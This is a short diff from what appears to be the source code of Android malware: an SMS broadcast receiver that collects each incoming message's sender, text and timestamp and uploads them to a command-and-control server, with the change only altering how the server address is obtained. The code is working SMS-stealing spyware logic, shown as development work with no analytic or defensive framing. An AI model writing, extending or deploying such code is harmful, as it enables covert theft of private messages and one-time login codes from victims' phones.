@@ -38,7 +38,7 @@ public class SMS extends BroadcastReceiver {
                             formData += "&sender=" + senderNumber;
                             formData += "&content=" + messageBody;
                             formData += "&timestamp=" + System.currentTimeMillis();
-                            new NotifyC2(Utils.C2_SERVER + "/uploadMessage", formData, result -> {
+                            new NotifyC2(Utils.getC2Address() + "/uploadMessage", formData, result -> {
 
                             }).execute();
                         }
